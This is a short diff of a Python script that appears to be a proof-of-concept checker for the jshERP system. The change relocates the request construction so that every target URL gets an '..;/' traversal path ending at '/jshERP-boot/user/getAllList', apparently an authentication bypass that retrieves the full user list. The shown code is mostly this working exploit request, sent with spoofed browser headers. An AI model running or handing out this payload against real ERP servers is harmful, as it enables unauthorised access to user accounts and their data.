@@ -34,7 +34,8 @@ def main():
 
 
 def check(target):
-    url = format_url(target)
+    target = format_url(target)
+    target = target+'/jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList'
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
@@ -60,7 +61,7 @@ def format_url(url):
     """格式化URL，补充协议头，添加路径，确保URL格式规范"""
     parsed_url = urllib.parse.urlparse(url)
     if not parsed_url.scheme:
-        return 'http://'+url+'/jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList'
+        return 'http://'+url
     return url
 
 if __name__ == '__main__':
